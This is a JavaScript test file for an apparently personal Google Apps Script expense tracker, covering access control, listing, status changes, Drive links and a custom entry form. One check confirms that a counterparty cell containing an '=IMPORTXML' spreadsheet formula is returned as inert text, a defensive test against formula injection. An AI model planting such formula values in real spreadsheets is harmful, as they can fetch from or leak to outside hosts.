try { G.uiSetStatus('work', 2, 'Claimed', '2026-03-01'); } catch (e) { strangerStatus = e.message; }
check('the status control is gated', /Not authorized/.test(strangerStatus || ''), strangerStatus);
check('and it changed nothing',
  mocks._ss.getSheetByName('Work').getRange(2, wcols['Status']).getValue() === 'To Do',
  mocks._ss.getSheetByName('Work').getRange(2, wcols['Status']).getValue());
// uiEntry returns a whole row and is a global like any other, so it is reachable
// without going through uiSetStatus. It asks for itself rather than relying on
// the function that happens to call it.
let strangerEntry = null;
try { G.uiEntry('work', 2); } catch (e) { strangerEntry = e.message; }
check('reading a single row is gated', /Not authorized/.test(strangerEntry || ''), strangerEntry);

// An anonymous deployment - which is what the Siri endpoint would force - makes
// getActiveUser() blank for EVERYONE. Failing closed is correct; it is also why
// Siri needs its own project rather than a second deployment of this one.
mocks.Session._setActiveUser('');
check('anonymous is refused', /Not authorized/.test(G.doGet().getContent()));
check('anonymous reason recorded', G.uiAccessCheck().reason === 'no identifiable signed-in user',
  G.uiAccessCheck());

mocks.Session._setActiveUser(mocks.Session._owner);
check('owner allowed again', G.uiAccessCheck().ok === true, G.uiAccessCheck());

section('checkUiAccess() — the editor-runnable diagnostic');
const diagnosis = G.checkUiAccess();
check('reports ok for the owner', diagnosis.ok === true, diagnosis);
check('names the active and effective users separately',
  diagnosis.activeUser === mocks.Session._owner &&
  diagnosis.effectiveUser === mocks.Session._owner, diagnosis);
check('says where the allowed list came from',
  diagnosis.allowedFrom === 'the account the script runs as', diagnosis.allowedFrom);
mocks.Session._setActiveUser('');
const blankDiagnosis = G.checkUiAccess();
check('a blank caller is described, not shown as an empty string',
  /blank/.test(blankDiagnosis.activeUser), blankDiagnosis);
check('and distinguished from being unlisted',
  blankDiagnosis.reason === 'no identifiable signed-in user', blankDiagnosis.reason);
mocks.Session._setActiveUser(mocks.Session._owner);

section('UI_ALLOWED_EMAILS overrides the default of "only me"');
mocks._props.UI_ALLOWED_EMAILS = 'Helper@Example.test , second@example.test';
check('a listed address is allowed (case and spacing ignored)',
  (() => { mocks.Session._setActiveUser('helper@example.test'); return G.uiAccessCheck().ok === true; })(),
  G.uiAccessCheck());
check('an unlisted address is refused even if it owns the script',
  (() => { mocks.Session._setActiveUser(mocks.Session._owner); return G.uiAccessCheck().ok === false; })(),
  G.uiAccessCheck());
delete mocks._props.UI_ALLOWED_EMAILS;
check('unset falls back to the account it runs as', G.uiAccessCheck().ok === true, G.uiAccessCheck());
check('UI_ALLOWED_EMAILS is a declared property, not an unknown one',
  G.checkScriptProperties().unknown.indexOf('UI_ALLOWED_EMAILS') === -1,
  G.checkScriptProperties().unknown);

/* ------------------------------ uiBootstrap ------------------------------- */
section('uiBootstrap() — one round trip describes all four sections');
mocks._props.REF_JALLC_NIF = '600000000';
mocks._props.REF_MY_NIF = '200000000';
mocks._props.REF_IVA_TIPO = 'Despesas gerais familiares';

const boot = G.uiBootstrap();
check('reports the signed-in user', boot.user === mocks.Session._owner, boot.user);
check('today is ISO', /^\d{4}-\d{2}-\d{2}$/.test(boot.today), boot.today);
check('four sections, in config order',
  boot.sections.map(s => s.key).join(',') === 'work,iva,health,income',
  boot.sections.map(s => s.key));

const metaOf = key => boot.sections.find(s => s.key === key);
check('counterparty labels come from config',
  ['work:Supplier', 'iva:Retailer', 'health:Provider', 'income:Paid by']
    .every(pair => metaOf(pair.split(':')[0]).counterpartyLabel === pair.split(':')[1]),
  boot.sections.map(s => [s.key, s.counterpartyLabel]));
check('category shown only where it exists',
  !!metaOf('work').category && metaOf('iva').category === null && !!metaOf('health').category,
  boot.sections.map(s => [s.key, s.category]));
check('IVA reference block filled from Script Properties',
  metaOf('iva').reference.length === 3 &&
  metaOf('iva').reference.some(r => r.label === 'Tipo' && r.value === 'Despesas gerais familiares'),
  metaOf('iva').reference);
check('other sections have no reference block',
  ['work', 'health', 'income'].every(k => metaOf(k).reference.length === 0));
check('a blank reference property is dropped rather than shown empty',
  (() => {
    const kept = mocks._props.REF_MY_NIF;
    delete mocks._props.REF_MY_NIF;
    const n = G.uiSectionMeta('iva').reference.length;
    mocks._props.REF_MY_NIF = kept;
    return n === 2;
  })());
check('health declares two documents', metaOf('health').files.length === 2, metaOf('health').files);
check('income declares none', metaOf('income').files.length === 0);
check('states carry their date column',
  metaOf('work').states.map(s => `${s.name}:${s.dateColumn}`).join(',') ===
    'To Do:null,Claimed:Claimed Date,Settled:Settled Date',
  metaOf('work').states.map(s => [s.name, s.dateColumn]));
check('income states are its own three',
  metaOf('income').states.map(s => s.name).join(',') === 'Invoiced,Received,Logged',
  metaOf('income').states);

section('table columns are generated from SECTIONS, and only real ones');
['work', 'iva', 'health', 'income'].forEach(key => {
  const meta = metaOf(key);
  const sheet = mocks._ss.getSheetByName(G.getSection(key).sheet);
  const cols = G.resolveColumns(sheet);
  check(`${key}: every displayed column exists in the sheet`,
    meta.columns.every(c => !!cols[c.header]),
    meta.columns.filter(c => !cols[c.header]).map(c => c.header));
  // Status, the state dates and the documents are controls, not text columns,
  // and Timestamp / Receipt State / Claim Emailed are bookkeeping.
  check(`${key}: bookkeeping columns are not in the table`,
    meta.columns.every(c => ['Status', 'Timestamp', 'Source', 'Receipt State', 'Claim Emailed',
      'Claimed Date', 'Settled Date', 'Invoiced Date', 'Received Date', 'Logged Date']
      .indexOf(c.header) === -1),
    meta.columns.map(c => c.header));
});
check('work shows Expense Reason and Type',
  ['Expense Reason', 'Type'].every(h => metaOf('work').columns.some(c => c.header === h)),
  metaOf('work').columns.map(c => c.header));
check("IVA shows Número, Emitente NIF and the VAT figure's own label",
  ['Número', 'Emitente NIF', 'IVA Amount'].every(h => metaOf('iva').columns.some(c => c.header === h)) &&
  metaOf('iva').columns.find(c => c.header === 'IVA Amount').label === 'Valor do IVA',
  metaOf('iva').columns.map(c => c.header));

/* ------------------------------ uiListEntries ----------------------------- */
section('uiListEntries()');
const listed = G.uiListEntries('work');
check('ok with rows', listed.ok === true && listed.rows.length > 0, listed.rows.length);
check('newest first',
  listed.rows.every((row, i) => i === 0 || listed.rows[i - 1].row > row.row),
  listed.rows.map(r => r.row));
check('row numbers are real sheet rows', listed.rows.every(r => r.row >= 2));
check('every displayed column has a cell',
  listed.rows.every(row => listed.meta.columns.every(c => row.cells[c.header] !== undefined)));
// google.script.run must not have to serialise Date objects, and the harness
// would not catch a Date leaking through any other way.
check('cells are strings and numbers only, never Dates',
  listed.rows.every(row => Object.keys(row.cells).every(h => {
    const v = row.cells[h];
    return typeof v === 'string' || typeof v === 'number';
  })), listed.rows.map(r => r.cells));
check('dates come back as ISO text or blank',
  listed.rows.every(row => Object.keys(row.dates)
    .every(col => row.dates[col] === '' || /^\d{4}-\d{2}-\d{2}$/.test(row.dates[col]))),
  listed.rows.map(r => r.dates));

const luz = listed.rows.find(r => r.cells['Counterparty'] === 'Hospital da Luz');
check('the first work entry is listed', !!luz, listed.rows.map(r => r.cells['Counterparty']));
check('its amount stayed a number', luz.cells['Amount'] === 3.45, luz.cells['Amount']);
check('its date is ISO', luz.cells['Date'] === '2026-01-15', luz.cells['Date']);
check('a bare file ID becomes a Drive link',
  luz.files.length === 1 && /^https:\/\/drive\.google\.com\/file\/d\//.test(luz.files[0].url),
  luz.files);
check('the document keeps its configured label', luz.files[0].label === 'Receipt', luz.files[0]);
check('receipt state passed through', luz.receiptState === 'attached', luz.receiptState);
// Reaches the page as inert text. Real Sheets strips the leading apostrophe on
// read and these stand-ins do not, so this asserts only what is true in both:
// the cell is a string containing the formula, never an evaluated result.
check('an escaped formula name comes back as text',
  listed.rows.some(r => typeof r.cells['Counterparty'] === 'string' &&
    r.cells['Counterparty'].indexOf('=IMPORTXML') !== -1),
  listed.rows.map(r => r.cells['Counterparty']));

const incomeList = G.uiListEntries('income');
check('income rows carry no documents',
  incomeList.rows.every(r => r.files.length === 0 && r.receiptState === 'none required'),
  incomeList.rows.map(r => [r.files.length, r.receiptState]));
check('income rows have no Claim Emailed flag', incomeList.rows.every(r => r.claimEmailed === null));
check('work rows do', listed.rows.every(r => typeof r.claimEmailed === 'boolean'));

// A row deleted by hand in the sheet leaves a gap. Rendering it as an empty line
// with a live status selector would invite a status change on nothing.
const workSheet = mocks._ss.getSheetByName('Work');
const gapRow = workSheet.getLastRow() + 1;
workSheet.getRange(gapRow, wcols['Notes']).setValue('leftover');
check('a row with no entry in it is skipped',
  G.uiListEntries('work').rows.every(r => r.row !== gapRow),
  G.uiListEntries('work').rows.map(r => r.row));
workSheet.getRange(gapRow, wcols['Notes']).setValue('');

/* ---------------------------- document links ------------------------------ */
// Found in a browser with two Google accounts signed in: every document link
// read "You need access". The file was fine and so was the link - it was being
// opened as the wrong person, because a bare Drive URL resolves against the
// browser's default account. The hint is the caller's own address, so it follows
// whoever is looking rather than naming one account for everybody.
section('document links say which account to open them as');
const ownerHint = `?authuser=${encodeURIComponent(mocks.Session._owner)}`;
const linkRows = G.uiListEntries('work').rows;
const storedAsUrl = linkRows.find(r => r.cells['Counterparty'] === 'Hospital da Luz');
const storedAsId = linkRows.find(r => r.cells['Counterparty'] === 'Symmetry Co' && r.files.length);
check('a reference stored as a full URL gets the hint',
  /^https:\/\/drive\.google\.com\/file\/d\/[-\w]{25,}\/view\?/.test(storedAsUrl.files[0].url) &&
  storedAsUrl.files[0].url.endsWith(ownerHint), storedAsUrl.files[0].url);
check('and so does one stored as a bare ID',
  storedAsId.files[0].url.endsWith(ownerHint), storedAsId.files[0].url);

mocks._props.UI_ALLOWED_EMAILS = `${mocks.Session._owner}, helper@example.test`;
mocks.Session._setActiveUser('helper@example.test');
check('the hint names the caller, not the account the script runs as',
  G.uiListEntries('work').rows
    .find(r => r.cells['Counterparty'] === 'Hospital da Luz')
    .files[0].url.endsWith('?authuser=helper%40example.test'),
  G.uiListEntries('work').rows.find(r => r.cells['Counterparty'] === 'Hospital da Luz').files[0].url);
mocks.Session._setActiveUser(mocks.Session._owner);
delete mocks._props.UI_ALLOWED_EMAILS;

const bareId = '1234567890123456789012345';
check('the address is escaped, so a + in it cannot start another parameter',
  G.uiFileUrl(bareId, 'a+b@example.test') ===
    `https://drive.google.com/file/d/${bareId}/view?authuser=a%2Bb%40example.test`,
  G.uiFileUrl(bareId, 'a+b@example.test'));
check('no address means no hint rather than an empty one',
  G.uiFileUrl(bareId, '') === `https://drive.google.com/file/d/${bareId}/view`,
  G.uiFileUrl(bareId, ''));
// Reading an ID out of some other service's URL would turn a working link into a
// broken one, so only Drive links are rebuilt.
const foreignUrl = 'https://example.test/receipts/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.pdf';
check('a link that is not Drive is left exactly as stored',
  G.uiFileUrl(foreignUrl, mocks.Session._owner) === foreignUrl,
  G.uiFileUrl(foreignUrl, mocks.Session._owner));
check('an empty cell is still no link', G.uiFileUrl('', mocks.Session._owner) === '');

/* --------------------------- the status control --------------------------- */
section('the status control, through the UI');
const target = G.uiListEntries('work').rows.find(r => r.cells['Counterparty'] === 'Hospital da Luz');
check('starts in To Do', target.status === 'To Do' && target.statusIndex === 0, target.status);

// This is what the date dialog reads: no date yet, so it offers today.
const toClaimed = target.options.find(o => o.state === 'Claimed');
check('dialog would offer Today for a state with no date yet',
  toClaimed.keepExisting === false && toClaimed.existingDate === '', toClaimed);
check('a state with no date column of its own needs no dialog',
  target.options.find(o => o.state === 'To Do').dateColumn === null);

const uiClaim = G.uiSetStatus('work', target.row, 'Claimed', '2026-03-05');
check('claimed', uiClaim.ok === true && uiClaim.entry.status === 'Claimed', uiClaim);
check('date recorded on the row', uiClaim.entry.dates['Claimed Date'] === '2026-03-05', uiClaim.entry.dates);
check('date returned as text, not a Date', typeof uiClaim.date === 'string', uiClaim.date);
check('no file errors', uiClaim.fileErrors.length === 0, uiClaim.fileErrors);
check('file renamed and filed', receipt.getName().includes('_Claimed_05-03-2026') &&
  receipt.parent.getName() === 'Claimed', receipt.getName());
check('the returned row is re-read from the sheet, not assumed',
  uiClaim.entry.cells['Counterparty'] === 'Hospital da Luz', uiClaim.entry.cells);

// Now the revert case, which is the reason the dialog wording is computed here.
const claimedAgain = G.uiListEntries('work').rows.find(r => r.row === target.row);
const backToClaimed = claimedAgain.options.find(o => o.state === 'Claimed');
check('dialog would offer "Keep 5 Mar" once the state has a date',
  backToClaimed.keepExisting === true && backToClaimed.existingDate === '2026-03-05', backToClaimed);

G.uiSetStatus('work', target.row, 'Settled', '2026-03-20');
const reverted = G.uiSetStatus('work', target.row, 'Claimed');
check('reverting keeps the original date', reverted.entry.dates['Claimed Date'] === '2026-03-05',
  reverted.entry.dates);
check('and clears the later one', reverted.entry.dates['Settled Date'] === '', reverted.entry.dates);
check('and shortens the filename chain',
  receipt.getName() === '260115_HospitalDaLuz_3-45_receipt_Claimed_05-03-2026.HEIC', receipt.getName());

section('the UI is told when a file operation failed');
const ghost = G.uiListEntries('work').rows.find(r => r.cells['Counterparty'] === 'Ghost');
const ghostResult = G.uiSetStatus('work', ghost.row, 'Settled', '2026-04-09');
check('status moved', ghostResult.entry.status === 'Settled', ghostResult.entry.status);
check('but the failure is reported alongside it', ghostResult.fileErrors.length > 0, ghostResult.fileErrors);
check('with the column that failed', !!ghostResult.fileErrors[0].column, ghostResult.fileErrors[0]);

section('editing a date without changing state');
const dateEdit = G.uiSetEntryDate('work', target.row, 'Claimed Date', '2026-03-09');
check('date changed', dateEdit.entry.dates['Claimed Date'] === '2026-03-09', dateEdit.entry.dates);
check('state untouched', dateEdit.entry.status === 'Claimed', dateEdit.entry.status);
const dateCleared = G.uiSetEntryDate('work', target.row, 'Claimed Date', '');
check('blank clears it', dateCleared.entry.dates['Claimed Date'] === '', dateCleared.entry.dates);
let uiBadCol = null;
try { G.uiSetEntryDate('work', target.row, 'Amount', '2026-01-01'); } catch (e) { uiBadCol = e.message; }
check('a non-date column is still refused', /not a date column/.test(uiBadCol || ''), uiBadCol);

let uiBadDate = null;
try { G.uiSetStatus('work', target.row, 'Claimed', 'today please'); } catch (e) { uiBadDate = e.message; }
check('a bad date is still refused', /valid yyyy-MM-dd/.test(uiBadDate || ''), uiBadDate);

// Found by clicking: a Claimed Date could be set on a row still in To Do, and
// setStatus would clear it on the next transition. Accepting a value that
// quietly disappears is worse than refusing it.
section('a date cannot be set for a state the row has not reached');
G.uiSetStatus('work', target.row, 'To Do');
const workSheetNow = mocks._ss.getSheetByName('Work');
let unreached = null;
try { G.uiSetEntryDate('work', target.row, 'Settled Date', '2026-05-01'); }
catch (e) { unreached = e.message; }
check('refused', /has not reached/.test(unreached || ''), unreached);
check('names the state and the current one',
  /Settled/.test(unreached || '') && /"To Do"/.test(unreached || ''), unreached);
check('and wrote nothing',
  workSheetNow.getRange(target.row, wcols['Settled Date']).getValue() === '',
  workSheetNow.getRange(target.row, wcols['Settled Date']).getValue());
check('clearing an unreached date is still allowed',
  G.uiSetEntryDate('work', target.row, 'Settled Date', '').ok === true);
check('the current state\'s own date is still editable',
  (() => {
    G.uiSetStatus('work', target.row, 'Claimed', '2026-05-02');
    return G.uiSetEntryDate('work', target.row, 'Claimed Date', '2026-05-03')
      .entry.dates['Claimed Date'] === '2026-05-03';
  })());
check('an earlier state\'s date is editable from a later state',
  (() => {
    G.uiSetStatus('work', target.row, 'Settled', '2026-05-10');
    return G.uiSetEntryDate('work', target.row, 'Claimed Date', '2026-05-04')
      .entry.dates['Claimed Date'] === '2026-05-04';
  })());
// A hand-typed Status must not lock the row: the UI is the only place anyone
// would notice it, so it has to remain repairable from there.
check('a row with an unrecognised status can still have its dates fixed',
  (() => {
    workSheetNow.getRange(target.row, wcols['Status']).setValue('Pending');
    const fixed = G.uiSetEntryDate('work', target.row, 'Settled Date', '2026-05-11');
    return fixed.ok === true && fixed.entry.dates['Settled Date'] === '2026-05-11';
  })());
check('and that row reports its status as off-vocabulary',
  G.uiEntry('work', target.row).statusIndex === -1, G.uiEntry('work', target.row).status);
G.uiSetStatus('work', target.row, 'Claimed', '2026-05-02');

// Format is checked before the reached-state rule, so a typo reports as a typo
// rather than as a state problem.
let wrongFormat = null;
try { G.uiSetEntryDate('work', target.row, 'Settled Date', '31/05/2026'); }
catch (e) { wrongFormat = e.message; }
check('a date in the wrong format reports the format, not the state',
  /valid yyyy-MM-dd/.test(wrongFormat || ''), wrongFormat);

section('every section lists through the same code path');
['work', 'iva', 'health', 'income'].forEach(key => {
  const data = G.uiListEntries(key);
  check(`${key}: lists`, data.ok === true && data.meta.key === key, data.ok);
  check(`${key}: rows carry one option per state`,
    data.rows.every(r => r.options.length === G.getSection(key).states.length),
    data.rows.map(r => r.options.length));
  check(`${key}: every option names a real state`,
    data.rows.every(r => r.options.every(o => G.stateIndex(G.getSection(key), o.state) !== -1)));
});

/* ---------------------------- checkDocuments ----------------------------- */
// Written to answer a question Drive's own listing cannot: of two similarly
// named files in one folder, which is the sheet actually pointing at?
section('checkDocuments() — references and orphans, both directions');
const docs = G.checkDocuments();
check('checked every non-empty file reference', docs.checked > 0, docs.checked);
check('sections with no documents contribute nothing',
  docs.rows.every(r => r.section !== 'income'), docs.rows.map(r => r.section));
check('an intact reference reports the real filename and folder',
  docs.rows.some(r => r.opens === true && /_receipt/.test(r.name || '') && !!r.folder),
  docs.rows.filter(r => r.opens).slice(0, 3));
check('a dead reference is reported as not opening',
  docs.rows.some(r => r.opens === false && !!r.error), docs.rows.filter(r => !r.opens));
check('and counted', docs.brokenReferences > 0, docs.brokenReferences);
check('the row and column of a bad reference are named',
  docs.rows.filter(r => !r.opens).every(r => r.row >= 2 && !!r.column),
  docs.rows.filter(r => !r.opens));

// A file nothing refers to is exactly what a broken reference leaves behind, and
// it is indistinguishable from a live one by name alone.
const strayFile = mocks.DriveApp._addFile('260810_SmokeTestLtd_3-45_justification.txt');
strayFile.moveTo(G.sectionFolder(G.getSection('health'), 'Inbox'));
const withOrphan = G.checkDocuments();
check('an unreferenced file in the tree is flagged as an orphan',
  withOrphan.orphans.some(o => o.id === strayFile.getId()), withOrphan.orphans);
check('the orphan report names its folder and section',
  withOrphan.orphans.every(o => !!o.folder && !!o.section), withOrphan.orphans);
check('a referenced file is never called an orphan',
  withOrphan.orphans.every(o => !docs.rows.some(r => r.id === o.id)), withOrphan.orphans);
check('ok is false while either problem exists', withOrphan.ok === false, withOrphan.ok);
strayFile.setTrashed(true);

/* ========================= step 8: the custom form ======================== */
/*
 * The form is the reason Google Forms was dropped, so what gets tested here is
 * mostly the things a Form could not do: fields generated from config, the
 * registry filling one answer from another, and a document arriving without
 * a trigger.
 */
section('the form is generated from SECTIONS');

const workForm = G.uiFormFields(G.getSection('work'));
const incomeForm = G.uiFormFields(G.getSection('income'));
const ivaForm = G.uiFormFields(G.getSection('iva'));
const headersOf = fields => fields.map(f => f.header);

check('asks for the date first, then who', headersOf(workForm).slice(0, 2).join(),
  'Date,Counterparty');
check('the counterparty field carries the section\'s own word',
  workForm[1].label === 'Supplier' && ivaForm[1].label === 'Retailer',
  [workForm[1].label, ivaForm[1].label]);
check('IVA asks for the fields Finanças wants',
  ['Número', 'Emitente NIF', 'IVA Amount'].every(h => headersOf(ivaForm).indexOf(h) !== -1),
  headersOf(ivaForm));
check('a choice field brings its options',
  (workForm.find(f => f.header === 'Type').options || []).indexOf('Taxi') !== -1,
  workForm.find(f => f.header === 'Type'));
check('currency defaults rather than being asked cold',
  workForm.find(f => f.header === 'Currency').defaultValue === 'EUR');
check('documents appear as file fields',
  G.uiFormFields(G.getSection('health')).filter(f => f.type === 'file').map(f => f.label).join() ===
  'Prescription / Invoice,Proof of payment',
  G.uiFormFields(G.getSection('health')).filter(f => f.type === 'file'));
check('income has no file field at all',
  incomeForm.every(f => f.type !== 'file'), incomeForm.filter(f => f.type === 'file'));

// Income's dates are business facts; the other sections' are not askable at
// creation, because setStatus clears the dates of every state after the target.
check('income asks for its three state dates',
  ['Invoiced Date', 'Received Date', 'Logged Date']
    .every(h => headersOf(incomeForm).indexOf(h) !== -1), headersOf(incomeForm));
check('work does not offer Claimed or Settled Date',
  headersOf(workForm).indexOf('Claimed Date') === -1 &&
  headersOf(workForm).indexOf('Settled Date') === -1, headersOf(workForm));

/*
 * The invariant that matters most. If the form calls a field optional and
 * missingFields() calls it required, every entry made through the form reports
 * itself incomplete and mails a completion request about a field it never asked
 * for. Checked by building a genuinely empty row and comparing the two.
 */
section('the form and missingFields() agree on what is required');
['work', 'iva', 'health', 'income'].forEach(key => {
  const section_ = G.getSection(key);
  const sheet = mocks._ss.getSheetByName(section_.sheet);
  const cols = G.resolveColumns(sheet);
  const blank = sheet.getLastRow() + 1;
  sheet.getRange(blank, G.columnIndex(cols, sheet.getName(), 'Notes')).setValue('probe');

  const reported = G.missingFields(section_, sheet, cols, blank).sort();
  const declared = G.uiFormFields(section_)
    .filter(f => f.required).map(f => f.label).sort();
  check(`${key}: same fields, same labels`, reported.join() === declared.join(),
    { reported, declared });

  sheet.getRange(blank, G.columnIndex(cols, sheet.getName(), 'Notes')).setValue('');
});

/* ------------------------------- creating -------------------------------- */
section('uiCreateEntry() — the form writes a row');

const b64 = 'c21va2U=';
const created = G.uiCreateEntry('work', {
  values: {
    'Date': '2026-09-01', 'Counterparty': 'Bolt', 'Expense Reason': 'Lisbon trip',
    'Type': 'Taxi', 'Amount': 12.5, 'Currency': 'EUR', 'Notes': 'airport'
  },
  files: [{ header: 'Receipt URL', name: 'IMG_0042.HEIC', mimeType: 'image/heic', data: b64 }]
});
check('created', created.ok === true, created);
check('the row comes back as the sheet now holds it',
  created.entry && created.entry.cells['Counterparty'] === 'Bolt', created.entry);
check('source recorded as the form',
  mocks._ss.getSheetByName('Work')
    .getRange(created.row, wcols['Source']).getValue() === 'form');
check('starts in the first state', created.entry.status === 'To Do', created.entry.status);
check('receipt state is attached', created.entry.receiptState === 'attached', created.entry.receiptState);

const uploaded = mocks.DriveApp.getFileById(
  G.extractFileId(mocks._ss.getSheetByName('Work').getRange(created.row, wcols['Receipt URL']).getValue()));
check('the upload was renamed from the row, not from what the browser sent',
  uploaded.getName() === '260901_Bolt_12-50_receipt.HEIC', uploaded.getName());
check('and filed in the section inbox', uploaded.parent.getName() === 'Inbox', uploaded.parent.getName());
check('the registry learned the supplier',
  G.loadRegistry().some(e => e.name === 'Bolt' && e.type === 'Taxi'),
  G.loadRegistry().map(e => [e.name, e.type]));

// An upload with no extension is the orphan-shaped problem: the rename chain
// carries the extension over from the original name, so one lost here is lost
// through every transition afterwards.
section('an upload with no extension gets one from its type');
const noExt = G.uiCreateEntry('iva', {
  values: {
    'Date': '2026-09-02', 'Counterparty': 'Worten', 'Número': 'A1',
    'Emitente NIF': '500000001', 'IVA Amount': 2, 'Amount': 10
  },
  files: [{ header: 'Receipt URL', name: 'scan', mimeType: 'application/pdf', data: b64 }]
});
const ivaFile = mocks.DriveApp.getFileById(G.extractFileId(
  mocks._ss.getSheetByName('IVA').getRange(noExt.row, G.resolveColumns(mocks._ss.getSheetByName('IVA'))['Receipt URL']).getValue()));
check('extension supplied from the mime type', /\.pdf$/.test(ivaFile.getName()), ivaFile.getName());

/* ------------------------------ refusals --------------------------------- */
section('the form does not trust the page');

let unknownField = null;
try {
  G.uiCreateEntry('work', { values: { 'Date': '2026-09-01', 'Salary': 100 } });
} catch (e) { unknownField = e.message; }
check('an unknown field is refused BY NAME, not silently dropped',
  /Salary/.test(unknownField || '') && /not a field/.test(unknownField || ''), unknownField);

// extractFileId takes a Drive ID out of any string and the script runs as you,
// so a supplied file reference would have a file of yours renamed and moved.
let suppliedFile = null;
try {
  G.uiCreateEntry('work', {
    values: { 'Date': '2026-09-01', 'Receipt URL': 'https://drive.google.com/file/d/somebodyelsesfileid1234567/view' }
  });
} catch (e) { suppliedFile = e.message; }
check('a document cannot be supplied as a value',
  /cannot be set directly/.test(suppliedFile || ''), suppliedFile);

let formBadDate = null;
try {
  G.uiCreateEntry('work', { values: { 'Date': '01/09/2026', 'Counterparty': 'X' } });
} catch (e) { formBadDate = e.message; }
check('a date in the wrong format names the field', /Date must be a valid/.test(formBadDate || ''), formBadDate);

let wrongUploadColumn = null;
try {
  G.uiCreateEntry('work', {
    values: { 'Date': '2026-09-01', 'Counterparty': 'X', 'Expense Reason': 'y', 'Amount': 1 },
    files: [{ header: 'Notes', name: 'x.pdf', mimeType: 'application/pdf', data: b64 }]
  });
} catch (e) { wrongUploadColumn = e.message; }
check('an upload aimed at a non-document column is refused',
  /is not a document/.test(wrongUploadColumn || ''), wrongUploadColumn);

const filesBefore = Object.keys(mocks._files).filter(id => !mocks._files[id].trashed).length;
let tooBig = null;
try {
  G.uiCreateEntry('work', {
    values: { 'Date': '2026-09-01', 'Counterparty': 'X', 'Expense Reason': 'y', 'Amount': 1 },
    files: [{ header: 'Receipt URL', name: 'huge.pdf', mimeType: 'application/pdf',
              data: 'x'.repeat(20 * 1024 * 1024) }]
  });
} catch (e) { tooBig = e.message; }
check('an oversized upload is refused before it is decoded',
  /too large/.test(tooBig || ''), tooBig);
check('and nothing was left in Drive',
  Object.keys(mocks._files).filter(id => !mocks._files[id].trashed).length === filesBefore);

/*
 * If something fails after a file has landed, the file must not be left behind -
 * that is precisely the orphan checkDocuments() hunts for.
 *
 * The failure has to happen AFTER an upload for this to test anything. An
 * earlier version of this test used a bad header, which is refused by the
 * whitelist BEFORE any upload runs, so it compared an unchanged file count and
 * passed while exercising nothing. Health has two documents, so a good one
 * followed by an oversized one lands a file and then fails, for real.
 */
section('a failed creation leaves no orphan behind');
const liveFiles = () => Object.keys(mocks._files).filter(id => !mocks._files[id].trashed).length;
const liveBefore = liveFiles();
let rolledBack = null;
try {
  G.uiCreateEntry('health', {
    values: { 'Date': '2026-09-03', 'Counterparty': 'X', 'Patient': 'K',
              'Invoice Date': '2026-09-03', 'Amount': 1 },
    files: [
      { header: 'Justification URL', name: 'j.pdf', mimeType: 'application/pdf', data: b64 },
      { header: 'Receipt URL', name: 'huge.pdf', mimeType: 'application/pdf',
        data: 'x'.repeat(20 * 1024 * 1024) }
    ]
  });
} catch (e) { rolledBack = e.message; }
check('the second document failed', /too large/.test(rolledBack || ''), rolledBack);
check('and the first one, which HAD landed, was trashed rather than stranded',
  liveFiles() === liveBefore, liveFiles() - liveBefore);
check('no half-made row was left either',
  !G.uiListEntries('health').rows.some(r => r.cells['Counterparty'] === 'X'),
  G.uiListEntries('health').rows.map(r => r.cells['Counterparty']));

/* ------------------------- incomplete, on purpose ------------------------- */
// Partial entries are the safety net, not an error: the row exists, and what is
// missing is said out loud rather than shown as a tick.
section('an incomplete entry is written and reported, not refused');
const formPartial = G.uiCreateEntry('health', {
  values: { 'Date': '2026-09-04', 'Counterparty': 'White Clinic', 'Amount': 70 }
});
check('the row exists', formPartial.row >= 2, formPartial.row);
check('but ok is false', formPartial.ok === false, formPartial.ok);
check('and it names what is missing',
  /Patient/.test(formPartial.error || '') && /Invoice date/.test(formPartial.error || ''), formPartial.error);
check('receipt recorded as awaited', formPartial.entry.receiptState === 'awaiting', formPartial.entry.receiptState);

/* ------------------------------- registry -------------------------------- */
section('the form fills one answer from another — what a Google Form cannot do');
const strong = G.uiLookupCounterparty('iva', 'Worten');
check('a confident match prefills the NIF',
  strong.autofill === true && strong.prefill['Emitente NIF'] === '500000001', strong);
const weak = G.uiLookupCounterparty('iva', 'fnak');
check('a weak match holds rather than guessing',
  weak && weak.autofill === false && Object.keys(weak.prefill).length === 0, weak);
check('and still says what it suspected, so the page can offer it',
  weak.name === 'FNAC' && weak.confidence < 0.85, weak);
check('suggestions come back for a prefix',
  G.uiSuggestCounterparty('wo', 5).some(s => s.name === 'Worten'), G.uiSuggestCounterparty('wo', 5));

/*
 * Found by using it: "white" offered White Clinic and "whitee clinic" offered
 * nothing, because the dropdown was substring-only while the fuzzy tiers lived
 * in findSupplier and were never asked. A typo mid-string is a substring of
 * nothing, so the length of what you typed was irrelevant - what mattered was
 * where the wrong letter fell.
 */
check('a typo still gets suggested, though substring matching cannot see it',
  G.uiSuggestCounterparty('whitee clinic', 5).some(s => s.name === 'White Clinic'),
  G.uiSuggestCounterparty('whitee clinic', 5));
check('the substring case is unchanged and still comes first',
  G.uiSuggestCounterparty('white', 5)[0].name === 'White Clinic',
  G.uiSuggestCounterparty('white', 5));
check('one letter drags nothing in — similarity is length-sensitive, so a short ' +
  'prefix only ever matches by substring',
  G.uiSuggestCounterparty('w', 20).every(s => /w/i.test(s.name)),
  G.uiSuggestCounterparty('w', 20));
check('and a name nothing like anything stored returns nothing',
  G.uiSuggestCounterparty('zzzqqq', 5).length === 0,
  G.uiSuggestCounterparty('zzzqqq', 5));

/*
 * The same typo, one layer down. A confident match must offer the CANONICAL name
 * back, because the counterparty is what the filename is built from and what the
 * registry is keyed on - so a near miss that is merely tolerated still ends up in
 * the filename and as a second supplier row. The page discarded this for a while:
 * its "never overwrite what you typed" guard covered the counterparty box, which
 * always holds what you typed, making this the one prefill that could never land.
 */
section('a confident match offers the name back, not just the details');
const typo = G.uiLookupCounterparty('health', 'whitee clinic');
check('scored above the autofill bar', typo.autofill === true && typo.confidence >= 0.85, typo);
check('and the canonical spelling is part of the prefill',
  typo.prefill['Counterparty'] === 'White Clinic', typo.prefill);
check('a match below the bar offers no name to write',
  Object.keys(G.uiLookupCounterparty('iva', 'fnak').prefill).length === 0);
check('an unknown section is refused before any sheet is touched',
  (() => { try { G.uiLookupCounterparty('nope', 'x'); return false; } catch (e) { return true; } })());

/*
 * Health's Patient is a closed list where Work's Expense Reason is not, and the
 * difference is the point: a trip is new most times it is asked for, whereas
 * "Pheonix" typed once becomes a second patient forever and splits that
 * person's claims across two values with nothing to warn you.
 */
section('a category with a declared list is a closed choice');
const patientField = G.uiFormFields(G.getSection('health'))
  .filter(f => f.header === 'Patient')[0];
